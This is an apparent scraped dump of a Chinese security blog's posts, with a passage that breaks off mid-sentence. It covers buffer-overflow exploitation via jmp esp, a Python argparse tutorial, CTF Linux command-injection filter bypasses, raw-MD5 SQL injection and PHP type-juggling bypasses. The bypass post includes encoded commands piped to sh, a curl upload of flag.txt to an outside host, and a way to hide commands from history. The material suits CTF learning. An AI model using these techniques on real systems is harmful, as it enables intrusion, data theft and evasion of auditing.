esp方法，也就是利用跳板进行跳转。 ​ 这里的跳板是程序中原有的机器代码，它们都是能够跳转到一个寄存器内所存放的地址进行执行，如jmp esp、call esp、jmp ecx、call eax等等。如果在函数返回的时候，CPU内寄存器刚好直接或者间接指向ShellCode的开头，这样就可以把对栈内存放的返回地址的那一个元素覆盖为相应的跳板地址。 ​ 我们画图来理解一下，上面的话是什么意思. 我们也用OD载入上一篇中的test1.exe，来具体分析一下，上面说的什么意思！ 我们直接执行到mian函数最后一个地址，然后F8一步步执行到0x4010a6地址中, 即retn语句处，此时我们关注一下esp寄存器所保存的值： 关注我标箭头的几个位置，我们继续执行： 主要关注esp的值。可以发现，esp的值由刚才的0x0012FF84变成了0x0012FF88，从栈空间来看，即刚才那个值的下一个位置。不要忘了，0x0012FF84位置正式我们想要修改的返回地址的位置。 ​ 总结一下，我们可以得知，当main函数执行完毕的时候，esp的值会自动变成返回地址的下一个位置，而esp的这种变化，一般是不受任何情况影响的。既然我们知道了这一个特性，那么其实就可以将返回地址修改为esp所保存的地址，也就是说，我们可以让程序跳转到esp所保存的地址中，去执行我们所构造的指令，以便让计算机执行。 ​ 当然了，以上我所讲的是正常的情况，也就是返回地址没有被破坏的情况，那么如果返回地址被破坏了，esp还具备这种特性吗？不妨再用OD载入test4.exe这个存在缓冲区溢出问题的程序，来研究一下，因为我们之前的字符长度,没办法覆盖到shellcode部分，所以我们加长字符，c代码如下: 12345678910111213#include&lt;stdio.h&gt; #include&lt;string.h&gt; //引入头文件char name[] = &quot;betaobetaobetaobetaobetao&quot;; //定义全局变量,！！！int main() //返回值 主函数main()&#123; char buffer[8]; //开辟80个字节的空间用来存储变量name ！！！ strcpy(buffer,name); //内置函数（作用）：将变量name内容赋值给buffer变量 printf(&quot;%s\\n&quot;,buffer); //输出 getchar(); //方便观察 作用：等待用户输入按键 return 0; //返回值&#125; 首先还是先来到main函数的retn的位置： 到这里我们就应该知道，为什么要跳转了吧？？？那么我们接下来要解决的就是，如果让程序跳转到 esp的位置呢，也就是执行jmp esp 这条指令 ,jmp esp指令对应的机器码是0xFFE4 我们接下来编写一个程序，来在user32.dll这个动态链接库中寻找jmp esp这个机器指令的内存地址（jmp esp很多动态链接库都有，这里只是做一个例子）： C代码如下: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#define DLL_NAME &quot;user32.dll&quot;int main()&#123; BYTE* ptr; int position,address; HINSTANCE handle; BOOL done_flag = FALSE; handle=LoadLibrary(DLL_NAME); if(!handle) &#123; printf(&quot; load dll erro !&quot;); exit(0); &#125; ptr = (BYTE*)handle; for(position = 0; !done_flag; position++) &#123; try &#123; if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4) &#123; //0xFFE4 is the opcode of jmp esp int address = (int)ptr + position; printf(&quot;OPCODE found at 0x%x\\n&quot;,address); &#125; &#125; catch(...) &#123; int address = (int)ptr + position; printf(&quot;END OF 0x%x\\n&quot;, address); done_flag = true; &#125; &#125; getchar(); return 0;&#125; 注：编译运行，文件名必须是.cpp后缀，不能.c 由上图可以看到，地址非常多，这里我使用倒数第二行0x77e35b79，也就是说，我需要使用这个地址来覆盖程序的返回地址。这样，程序在返回时，就会执行jmp esp，从而跳到返回地址下一个位置去执行该地址处的语句。 ​ 还有一个注意点：有很多种方法可以获取jmp esp，而且不同的系统这个地址可能是不同的。 接下来我们进行地址的验证。我们随便附加一个进程可执行文件。 总结​ 到这里可以先总结一下我们即将编写name数组中的内容了，经过以上分析可知道，其形式为betaobetaobeXXXXShellcode...,前面12个为任意字符，XXXX返回地址我们使用0x77e35b79 而Shellcode....便是我们想要计算机执行的代码。shellcode编写待更…(需要汇编基础)","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"溢出攻击","slug":"溢出攻击","permalink":"https://taonn.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"}]},{"title":"缓冲区溢出原理分析(一)","slug":"缓冲区溢出原理分析-一","date":"2020-10-06T00:25:57.000Z","updated":"2021-03-16T05:28:01.309Z","comments":true,"path":"2020/10/06/缓冲区溢出原理分析-一/","link":"","permalink":"https://taonn.github.io/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-%E4%B8%80/","excerpt":"","text":"什么是缓冲区溢出？？？先作下类比，如果某个人把一瓶啤酒全部倒入一个小杯子中，那装不下的啤酒就会四处冒出，流到桌子上。 同样的道理，在计算机内部，输入数据通常被存放在一个临时空间内，这个临时存放空间就被称为缓冲区，缓冲区的长度事先已经被程序或者操作系统定义好了。缓冲区就很像那个啤酒杯，用来装东西，而且大小固定。 向缓冲区内填充数据，如果数据的长度很长（如同那瓶啤酒），超过了缓冲区（那个啤酒杯）本身的容量，那么结果就如同啤酒一样，四处溢出，数据也会溢出存储空间！装不下的啤酒会流到桌子上，而装不下的数据则会覆盖在合法数据上，这就是缓冲区和缓冲区溢出的道理。当然在理想的情况下，程序检查每个数据的长度，并且不允许超过缓冲区的长度大小，就像在倒啤酒的时候，啤酒要冒出杯子时我们就停止。但有些程序会假设数据长度总是与所分配的存储空间相匹配，而不作检查，从而为缓冲区溢出埋下隐患。OK，那我们如何利用缓冲区溢出呢在一般情况下，就像啤酒会到处流满桌面一样，溢出的数据会覆盖掉任何数据、指针或内容。除了破坏之外，对攻击者来说没有任何好处。但我们可引导溢出的数据，使计算机执行我们想要的命令。这就是很多漏洞公告上说的：‘黑客可以用精心构造的数据…… ​ - &gt; 摘选自 王炜老师的《Q版缓冲区溢出教程》 实验环境 操作机： windows XP 工具： DA pro , OllyDbg，vc++6.0； 测试软件：test1.exe, test2.exe 我们下面的实验是通过编写两个C例程序，使用工具OD，IDA pro进行逆向分析。针对汇编语句中CALL机制剖析缓冲区溢出的基本原理 。 实验准备：编写C代码程序，编译 test1.c,代码如下： 12345678910111213#include&lt;stdio.h&gt; #include&lt;string.h&gt; //引入头文件char name[] = &quot;betao&quot;; //定义全局变量int main() //返回值 主函数main()&#123; char buffer[8]; //开辟8个字节的空间用来存储变量name strcpy(buffer,name); //内置函数（作用）：将变量name内容赋值给buffer变量 printf(&quot;%s\\n&quot;,buffer); //输出 getchar(); //方便观察 作用：等待用户输入按键 return 0; //返回值&#125; 以上test1.c代码中，因为’betao’为超过buffer的空间，所以不会引起缓冲区溢出 test2.c代码如下： 12345678910111213#include&lt;stdio.h&gt; #include&lt;string.h&gt; //引入头文件char name[] = &quot;betaobetaobetao&quot;; //定义全局变量,！！！ 注意，这里多了两个betaoint main() //返回值 主函数main()&#123; char buffer[8]; //开辟8个字节的空间用来存储变量name strcpy(buffer,name); //内置函数（作用）：将变量name内容赋值给buffer变量 printf(&quot;%s\\n&quot;,buffer); //输出 getchar(); //方便观察 作用：等待用户输入按键 return 0; //返回值&#125; 以上test2.c代码，因为copy给buffer超出了空间，所以导致缓冲区溢出 将C语言代码使用vc++6.0编程成可执行文件，大概步骤 新建win32 console application -&gt; 新建 C++ 源文件 -&gt; 编写代码 -&gt; 编译(选择win32 Debug) -&gt; 生成exe可执行文件 编译选择win32 debug操作如下： 右键点击菜单空白处——选择“组建”——选择“Win32 Debug“——重新编译链接 首先，我们先来运行一些编译好了的可执行文件test1.exe and test2.exe，看看两者区别 第一个程序，没有任何异常 可见程序已经得到了正确的执行与输出。但是我在程序中所创建出来的是一个8字节长度的数组，而我在程序中的输入是5个字节。如果我的输入超过八个字节会怎么样呢？ 接下来，我们执行第二个程序 可见，程序虽然也能够正确输出，但是却弹出了错误提示对话框。为什么会出现这种情况？我们接下来就来研究一下。 我们首先分析一下无异常的程序，也就是test1.exe，这里我们使用ollydbg来分析 将test1.exe载入ollydbg中，ollydbg载入方式有两种： 鼠标直接将exe执行程序拖入OD控件区域 文件 -&gt; 附加 -&gt; 选择运行中的程序 因为我们需要从main函数开始分析，而上图：004015B0地址为软件初始运行地址，并非main函数的起始地址。所以我们需要寻找main函数的内存地址。我们使用 IDA Pro 打开程序寻找，当然我们可以不断地按F8单步执行，通过观察获取，但是这样未免需要一定的经验，而且也比较麻烦。所以我们将程序拖入IDA中 如果不是图上的情况，而是图下的情况，按一下空格键，即可调出图上内容 双击进入如下页面： 按下空格键 可见,IDA已经帮我们获取了main函数的入口地址，即0x00401010 ,此时，我们可以切换到OD中，Ctrl + G 输入401010跳到该位置，按F2设置一个断点( 某个内存地址下了F2断点,当程序运行到此处的时候就会断下来 ) 由上面的截图，我们除了可以知道main函数的位置外，我们还从下面那段话“跳转来自 00401005”（英文版的是：jump from 00401005）得知main函数是由位于0x00401005位置处的语句跳过来的。由于缓冲区溢出是与栈空间紧密相关的，所以我们现在应当分析调用（CALL）main函数前后，栈空间的情况，所以这里我们就需要定位究竟是哪条语句调用了main函数。如果仅仅通过OD，我们是比较难定位的，所以这里我还是使用IDA Pro。 由于已经知道main函数的地址是0x00401010，那么我们在IDA中，用鼠标在该地址点一下，之后利用快捷键“Ctrl+X”打开“交叉引用窗口”，就来到了jmp到此的函数位置： 然后在0x00401005的地址处，再次利用“交叉引用”功能，我们就能够找到调用main函数的位置了： 位于 0x00401694处的语句调用了main函数，那么接下来我们在OD中来分析堆栈的情况 继续Ctrl + G 输入 401694 跳转到执行main函数的内存地址，F2设置断点 注意上图中 红色箭头和黄色箭头的地方 ​ 红色箭头 CALL语句下面的地址是0x00401699。这个地址很重要，为什么重要呢？因为我们的程序在进入每一个CALL之前，都会首先将CALL下面那条语句的地址入栈，然后再执行CALL语句。这样当CALL执行完后，程序再将该地址出栈，这样就能够知道下一步应该执行哪条指令. 我们一般也将这个地址称为“返回地址”，它告诉程序：“CALL执行完后，请执行这个地址处的语句。” 我们按下F9，跳转到此位置，查看栈中内容： 我们接下来按F7，进入这个CALL,此时再看一下栈空间(注：栈空间由下至上是高地址往低地址处走的 ) 是上上图CALL语句下一个内存地址哦，由此可见，返回地址0x00401669已经入栈 . 分析main函数的缓冲区情况 因为我们在源程序中创建了一个8个字节大小的数组，因此进入main函数后的首要工作就是为这个局部变量分配空间。由于我们的程序是以Debug形式编译的，所以它会多分配一些空间（Release版本则会分配正好的空间）。结合本程序可以看到，它为我们分配的局部变量空间大小为0x4C(7C - 34)-&gt;（F8一步步向下执行）： 在上图中，比较重要的是最后两行。其中最后一行在之前已经说过了，是非常重要的返回地址，它决定了当main函数执行完毕后，程序所要执行的语句的地址，而倒数第二行是父函数的EBP 。 再往上，就是我们的main函数的局部变量空间。这里大家可能会有疑惑，既然是分配给我们的空间，那么为什么还会有其它的数据呢？ 我们继续往下执行 ,当我们执行完0x401026 0X4C的空间大小(7C - 34), 这段空间都被0xCC填充了。这是因为程序为了容错性与保持自身的健壮性，于是利用0xCC，即int 3断点来填充满这段区域，这样一来，如果有未知的程序跳到这片区域，就不会出现崩溃的情况，而是直接断下来了。当然，这个问题与我们的缓冲区溢出没什么关系。 继续执行： 这里将betao入栈了，说明执行到了strcpy()，这个函数，我们通过IDA来查看一下，strcpy()函数的位置 继续执行，查看堆栈中的情况 发现strcpy函数的第二个参数，也就是接收字符串所保存的位置，其保存的位置为0X0012FF78(buffer变量) 到这里程序无异常，正常执行，继续F8，直至retn 这个地址是不是很熟悉呢？没错就是返回地址 对溢出程序分析其余跟上面步骤类似，我们直接跳至执行strcpy函数的内存地址分析 继续执行，执行至retn,查看堆栈此时的情况: 我们右键显示一下ascii码： 由上图可知： 原本返回值：0x00401699地址被占用 且指向错误的地址（或不应该的地址） F8执行，结果如图 此时我们发现了两件事，一件是OD中的反汇编代码窗口是空的，说明0x006F6174地址处不存在指令，或者说它就是一个无效地址。第二件事是OD弹出了错误对话框，提示我们该地址出错，这与我们直接执行程序时所弹出的错误对话框有几分类似。 这里先补充一下，为什么返回地址显示的是tao,而不是aob，因为buffer 空间只有8个字节，而我输入了15个字节，buffer后面的四个字节是ebp的地址. 12betaobet aobe tao拷贝字符 EBP 覆盖内容 补充：我们也可以通过执行test2.exe程序 总结：缓冲区漏洞的原理，它就是因为我们输入了过长的字符，而缓冲区本身又没有有效的验证机制，导致过长的字符将返回地址覆盖掉了，当我们的函数需要返回的时候，由于此时的返回地址是一个无效地址，因此导致程序出错。 那么依据这个原理，假设我们所覆盖的返回地址是一个有效地址，而在该地址处又包含着有效的指令，那么我们的系统就会毫不犹豫地跳到该地址处去执行指令。因此，如果想利用缓冲区溢出的漏洞，我们就可以构造出一个有效地址出来，然后将我们想让计算机执行的代码写入该地址，这样一来，我们就通过程序的漏洞，让计算机执行了我们自己编写的程序。 本文例子参考来源： https://blog.csdn.net/ioio_jy/article/details/48316029","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"溢出攻击","slug":"溢出攻击","permalink":"https://taonn.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"}]},{"title":"Python3--argparse模块简要使用","slug":"Python3-argparse模块简要使用","date":"2020-10-04T01:27:05.000Z","updated":"2021-03-16T05:27:41.357Z","comments":true,"path":"2020/10/04/Python3-argparse模块简要使用/","link":"","permalink":"https://taonn.github.io/2020/10/04/Python3-argparse%E6%A8%A1%E5%9D%97%E7%AE%80%E8%A6%81%E4%BD%BF%E7%94%A8/","excerpt":"","text":"前言Python3中的argparse模块，是用来做命令行参数解析的，因为optparse模块已经不再更新，所以特此来为argparse的使用做个笔记 官网是这样说明的： 3.2版后已可移除：该optparse模块已弃用，将不再进行开发；该argparse模块将继续开发 optparse官方说明地址： https://docs.python.org/zh-cn/3.7/library/optparse.html 这个模块的基本使用步骤跟optparse差别不大，使用步骤如下: 12345import argparse # 导入模块parser &#x3D; argparse.ArgumentParser() # 创建一个解析对象parser.add_argument() # 添加参数parser.parse_args() # 解析 **argparse.ArgumentParse()**方法有很多参数，但是最常用的就是description, prog = None # 程序名，默认为sys.argv[0]。另外，如果你需要在help中使用到程序的名字，可以使用%(prog)s description = None # help时显示的开始文字 epilog = None # help时显示的结尾文字 prefix_chars=’-‘, - 命令的前缀，默认是‘-’ add_help=True # 是否增加-h/–help选项，默认是True) usage：# 描述程序用途的字符串 ….. 更详细的使用，查看官方文档： https://docs.python.org/zh-cn/3.7/library/argparse.html add_argument() 方法和参数，我们实际使用来介绍: 12345678910111213# file-name:print_name.pyimport argparsedef main(): parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Dome of argparse &#39;) parser.add_argument(&#39;--name&#39;, &#39;-n&#39;, default&#x3D;&#39;Tao&#39;) return parserif __name__ &#x3D;&#x3D; &#39;__main__&#39;: parser &#x3D; main() args &#x3D; parser.parse_args() name &#x3D; args.name print(&#39;Hello &#123;0&#125;&#39;.format(name)) 上述代码执行结果： 12$ python print_name.py --name dog# 输出： Hello dog 上面的代码中，我们首先导入了argparse模块，然后通过 argparser.ArgumentParser函数生成argparser对象 ，其中这个函数的description字段，表示在命令行显示的帮助信息时输出这个程序的描述信息，然后我们通过add_argument函数来增加参数，这里我添加了两个参数-n和--name，其中有个默认值字段default是Tao。然后我们这里发现，同一个值的设定可以设置多个参数。 这里默认值的意思是，如果我们不传这个参数，那么这个参数的值默认就是Tao 12$ python print_name.py# 输出： Hello Tao 最后我们通过argpaser对象的parser_args函数来获取所有参数args，然后通过args.name的方式得到我们设置的-name参数的值，可以看到这里argparse默认的参数名就是--name形式里面--后面的字符串 。 一 . default ：没有设置值情况下的默认参数 二 . required ：表示这个参数是否一定需要设置 如果设置了required=True,然则在实际的运用中不设置该参数，那么则会报错， 1$ python print_name.py 输出如下信息 12usage: print_name.py [-h] --name NAMEprint_name.py: error: the following arguments are required: --name type 指定参数类型，默认是str, 还有int,float等 如果你的程序需要整数运算的话，那么需要指定type=int 123456789101112import argparsedef main(): parser = argparse.ArgumentParser(description=&#x27;Dome of argparse &#x27;) parser.add_argument(&#x27;--num&#x27;, type=int) return parserif __name__ == &#x27;__main__&#x27;: parser = main() args = parser.parse_args() sum = args.num print(1+sum) 执行结果: 12python print_num.py --num 10# 输出：11 没有指定的话，则会报错 12345python print_num.py --num 10Traceback (most recent call last): File &quot;print_num.py&quot;, line 13, in &lt;module&gt; print(1+sum)TypeError: unsupported operand type(s) for +: &#x27;int&#x27; and &#x27;str&#x27; dest 设置参数在代码中的变量名 argparse默认的变量名是--或-后面的字符串，但是你也可以通过dest=xxx来设置参数的变量名，然后在代码中用args.xxx来获取参数的值 choices 参数值只能从几个选项里面选择 help 指定参数的说明信息 告诉别人这个参数有啥作用 通过代码来解释一下： 12345678910111213141516import argparsedef choices(): parser = argparse.ArgumentParser(description=&#x27;Choices Dome&#x27;) parser.add_argument(&#x27;-c&#x27;, dest=&#x27;choice&#x27;, required=True, choices=[&#x27;Tao&#x27;,&#x27;xiaoming&#x27;], help=&#x27;Choose a person you love&#x27;) return parserdef main(): parser = choices() args = parser.parse_args() choice = args.choice print(&#x27;You choices is &#123;0&#125;&#x27;.format(choice))iif __name__ == &#x27;__main__&#x27;: main() 帮助信息的输出： 123456789$ python print_choices.py -husage: print_choices.py [-h] -c &#123;Tao,xiaoming&#125;Choices Domeoptional arguments: -h, --help show this help message and exit -c &#123;Tao,xiaoming&#125; Choose a person you love # 在这里！！！ 选择一个参数，结果执行如下： 12$ python print_choices.py -c Tao# 输出结果： You choices is Tao nargs 命令行参数的个数，指定这个参数后面的value有多少个，默认为1. 12345值 含义N 参数的绝对个数（例如：3）&#x27;?&#x27; 0或1个参数&#x27;*&#x27; 0或所有参数&#x27;+&#x27; 所有，并且至少一个参数 代码实现： 12345678910111213import argparsedef get_parser(): parser = argparse.ArgumentParser(description=&#x27;nargs Dome&#x27;) parser.add_argument(&#x27;-n&#x27;, dest=&#x27;name&#x27; ,required=True, type=str, nargs=&#x27;+&#x27;) return parserif __name__ == &#x27;__main__&#x27;: parser = get_parser() args = parser.parse_args() names = &#x27;, &#x27;.join(args.name) print(&#x27;Hello %s&#x27; % names) 使用如下： 12$ python print_name.py -n Tao xiaomingHello Tao, xiaoming 关于add_argument详细参数使用如下： 1234567891011121314ArgumentParser.add_argument(name or flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest])定义应该如何解析一个命令行参数。下面每个参数有它们自己详细的描述，简单地讲它们是：name or flags - 选项字符串的名字或者列表，例如foo 或者-f, --foo。action - 在命令行遇到该参数时采取的基本动作类型。nargs - 应该读取的命令行参数数目。const - 某些action和nargs选项要求的常数值。default - 如果命令行中没有出现该参数时的默认值。type - 命令行参数应该被转换成的类型。choices - 参数可允许的值的一个容器。required - 该命令行选项是否可以省略（只针对可选参数）。help - 参数的简短描述。metavar - 参数在帮助信息中的名字。dest - 给parse_args()返回的对象要添加的属性名称。 参考文章： https://www.cnblogs.com/piperck/p/8446580.html http://vra.github.io/2017/12/02/argparse-usage/ https://docs.python.org/zh-cn/3.7/library/argparse.html","categories":[{"name":"Python","slug":"Python","permalink":"https://taonn.github.io/categories/Python/"}],"tags":[{"name":"Python常用模块","slug":"Python常用模块","permalink":"https://taonn.github.io/tags/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97/"}]},{"title":"Linux在CTF中的一些小技巧","slug":"Linux在CTF中的一些小技巧","date":"2020-10-04T01:24:32.000Z","updated":"2021-03-16T05:28:37.891Z","comments":true,"path":"2020/10/04/Linux在CTF中的一些小技巧/","link":"","permalink":"https://taonn.github.io/2020/10/04/Linux%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/","excerpt":"","text":"CTF中各种花里胡哨的操作还是挺多的，这里参考大佬的文章，做了更详细的总结！ 场景一：限制空格 假如需要实现 cat flag.txt 命令读取flag： 利用&lt;&gt;重定向符： 利用${IFS}变量(内部域分隔符)： 利用{,}来代替： 利用$IFS$9: 场景二：不允许指定命令执行 假如需要执行 uname 命令，但过滤掉了 uname 字符： 利用参数拼接（黑名单绕过）： 利用’ “ 单、双引号（碰到 escapeshellcmd() 时有效bypass）： 单、双引号成对出现不过滤，表示空字符串； 利用 ` 小引号，就是Tab上那个引号： 如果一串命令中存在``，会先执行引号内的命令； 这也就是利用DNS传数据的利用点； 利用转义符号\\反斜杠来绕过 场景三：一次执行多条命令假如需要执行uname和id命令： 利用shell脚本结束符; 分号： 利用逻辑符号(&amp;,&amp;&amp;,|,||) 在Web页面执行时可以利用回车的url编码 %0a 来绕过 类似在shell脚本下放了两条命令 命令编码绕过base64: 1234root@Tao:/tmp# printf &quot;whoami&quot; | base64d2hvYW1proot@Tao:/tmp# printf &quot;d2hvYW1p&quot; | base64 -d | shroot xxd（16进制）： 1234root@Tao:/tmp# printf &quot;whoami&quot; | xxd -p77686f616d69root@Tao:/tmp# printf &quot;77686f616d69&quot; | xxd -r -p | shroot 字符替换Linux 12345678910root@Tao:/tmp# echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binroot@Tao:/tmp# echo $&#123;PATH:5:1&#125;lroot@Tao:/tmp# echo $&#123;PATH:2:1&#125;sroot@Tao:/tmp# echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;lsroot@Tao:/tmp# $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;flag.txt tao.sh Linux：${PATH~: a :b} 其中a表示从a位开始，b表示截取的长度； （从0开始！！！） 如果过滤了冒号: 123456root@Tao:/tmp# echo $(expr substr $PATH 6 1)lroot@Tao:/tmp# echo $(expr substr $PATH 3 1)sroot@Tao:/tmp# $(expr substr $PATH 6 1)$(expr substr $PATH 3 1)flag.txt tao.sh Windows: 1234E:\\tmp&gt;echo %PATH%:~13,1C:\\Program Files (x86)\\....E:\\tmp&gt;echo %PATH:~14,1%e Windows：%PATH:~a,b% (从1开始数) curl -T 上传文件首先，windows主机监听端口 1E:\\tmp&gt;nc.exe -l -v -p 2333 Linux服务器发送文件： 1curl -T .&#x2F;flag.txt http:&#x2F;&#x2F;1.1.1.1:2333 防止命令被记录在终端执行的每一条命令都会被记录在 history 文件中？ 不是的，如果在命令前加个空格，则会不被记录； 并且前后重复的命令不会被记录； note： debain系可以，centos系不行； 利用文件名执行命令 *是Linux下的通配符，它会将符合模式的文件列出来，之后执行； 1234567root@Tao:/tmp# lsroot@Tao:/tmp# touch bashroot@Tao:/tmp# echo id &gt;&gt; tao.bashroot@Tao:/tmp# lsbash tao.bashroot@Tao:/tmp# *uid=0(root) gid=0(root) 缁�=0(root) 参考文章: https://ai-sewell.me/2017/Some-tricks-of-Linux-in-CTF/","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://taonn.github.io/tags/CTF/"}]},{"title":"MD5加密后的SQL注入(骚操作)","slug":"MD5加密后的SQL注入-骚操作","date":"2020-10-04T01:19:11.000Z","updated":"2021-03-16T05:28:27.739Z","comments":true,"path":"2020/10/04/MD5加密后的SQL注入-骚操作/","link":"","permalink":"https://taonn.github.io/2020/10/04/MD5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84SQL%E6%B3%A8%E5%85%A5-%E9%AA%9A%E6%93%8D%E4%BD%9C/","excerpt":"","text":"前言事情的起因是,我在看一篇大佬写的writeup,关于sniperoj-web的解析，我发现了一个关于MD5加密sql注入的骚操作，我便自己开始搭环境，准备复现一波 我这里利用的是dvwa的账号密码的环境 5f4dcc3b5aa765d61d8327deb882cf99放到MD5解密网站解密为password，这我就不详细说了 实验过程关于这里sql注入，大佬是这样说的 于是我之前搭建环境，进行了测试.(以下是我自己为了测试，写的代码) 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;GET&quot;&gt; USERNAME:&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br /&gt; PASSWORD:&lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;sub&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php$host = &#x27;localhost&#x27;;$user = &#x27;root&#x27;;$passwd = &#x27;root&#x27;;if (isset($_GET[&#x27;sub&#x27;]))&#123; $username = $_GET[&#x27;username&#x27;]; $password = $_GET[&#x27;password&#x27;]; $conn = new PDO(&quot;mysql:host=$host;dbname=dvwa&quot;, $user, $passwd); $sql = &quot;SELECT * FROM users WHERE password = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;; // 重点在这里 $q = $conn-&gt;query($sql); $res = $q-&gt;fetch(); if ($username == &#x27;admin&#x27; and $res[&#x27;password&#x27;] == md5(&#x27;password&#x27;))&#123; echo $username.&#x27;登录成功！&#x27;; &#125;&#125;else&#123; echo &quot;请登入！&quot;;&#125;?&gt; 大概的原理就是$sql = &quot;SELECT * FROM users WHERE password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;; 上述的查询语句，如果$password= ffifdyop , md5后，276f722736c95d99e921722cf9ed621c ， 再转成字符串： ‘or’6 那么sql语句就成了SELECT * FROM users WHERE password = &#39;&#39;or&#39;6&lt;trash&gt;&#39; ,从而绕过 我们进行测试： 参考文章 https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html","categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"php安全","slug":"php安全","permalink":"https://taonn.github.io/tags/php%E5%AE%89%E5%85%A8/"}]},{"title":"PHP黑魔法学习总结","slug":"PHP黑魔法学习总结","date":"2020-10-04T01:17:05.000Z","updated":"2021-03-16T05:27:51.057Z","comments":true,"path":"2020/10/04/PHP黑魔法学习总结/","link":"","permalink":"https://taonn.github.io/2020/10/04/PHP%E9%BB%91%E9%AD%94%E6%B3%95%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"","text":"php黑魔法 php黑魔法就是所谓的弱类型比较，一些函数返回null,利用数组返回True的一些问题 弱类型比较123456789101112131415161718&lt;?php$a = &#x27;betao.cn&#x27;;if ($a == 0)&#123; echo &#x27;Ture&#x27;;&#125;else&#123; echo &#x27;False&#x27;;&#125; // 以上代码输出 Tureecho &#x27;&lt;hr&gt;&#x27;;$b = &#x27;3betao.cn&#x27;; if ($b &gt; 2)&#123; echo &quot;True&quot;; &#125;else&#123; echo &#x27;False&#x27;;&#125;// 输出True// 以上代码说明了：若字符串以数字开头，则取开头数字作为转换结果，若无则输出0 总结： 以上代码说明了，若字符串以数字开头，则取开头数字作为转换结果，若无则输出0 md5(),sha1() PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0 md5()是不能处理数组的，md5(数组)会返回null，两个null相等绕过,sha1()也是同理 1234567891011&lt;?php$a = &#x27;QNKCDZO&#x27;;$b = &#x27;s878926199a&#x27;;$md5_a = md5($a); echo $md5_a.&#x27;&lt;br&gt;&#x27;;$md5_b = md5($b); echo $md5_b.&#x27;&lt;br&gt;&#x27;;if ($md5_a == $md5_b)&#123; echo &#x27;True&#x27;;&#125;else&#123; echo &#x27;False&#x27;;&#125;?&gt; 这种问题也叫MD5碰撞，更详细更多的可以参考我之前的文章：https://www.betao.cn/archives/md5same.html 123456789101112&lt;?php$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];echo md5($a).&#x27;&lt;br&gt;&#x27;;echo md5($b).&#x27;&lt;br&gt;&#x27;;if (md5($a) === md5($b))&#123; echo &#x27;True&#x27;; // 输出True&#125;else&#123; echo &#x27;Flase&#x27;;&#125;// betao.cn?&gt; 上面代码产生的原因为，md5不能处理数组，返回null 转换 php会自动进行转换，比如16进制，科学计数法等，有时也用这点绕过 strcmp函数数组绕过 12345678&lt;?php$a = $_GET[&#x27;a&#x27;];if (strcmp(&#x27;betao.cn&#x27;, $a))&#123; echo &#x27;Flase&#x27;; &#125;else&#123; echo &#x27;True&#x27;;&#125;?&gt; 利用数组a[]=1, 返回True，成功绕过验证 strcmp()函数只有在相等的情况下返回0。那么我们传入一个数组，它会返回NULL，而判断使用了，而NULL=0是bool(true)，这样就成功绕过。 ereg() 或者 eregi() ereg() 函数或 eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据 详细的说明，参考： https://www.betao.cn/archives/giveup.html is_numeric() is_numeric()**作用： 判断变量是否为数字或数字字符串，不仅检查10进制，16进制**是可以 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过 16进制也可以绕过is_numeric()检验，可以用来绕过sql注入里的过滤 12345678910111213&lt;?php$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];$c = is_numeric($a) and is_numeric($b);var_dump(is_numeric($a));echo &#x27;&lt;br&gt;&#x27;;var_dump(is_numeric($b));echo &#x27;&lt;br&gt;&#x27;;var_dump($c); // 返回Trueecho &#x27;&lt;br&gt;&#x27;;$test = false and true; // 返回Falsevar_dump($test);?&gt; is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！ 该函数还可能造成sql注入，例如将‘1 or 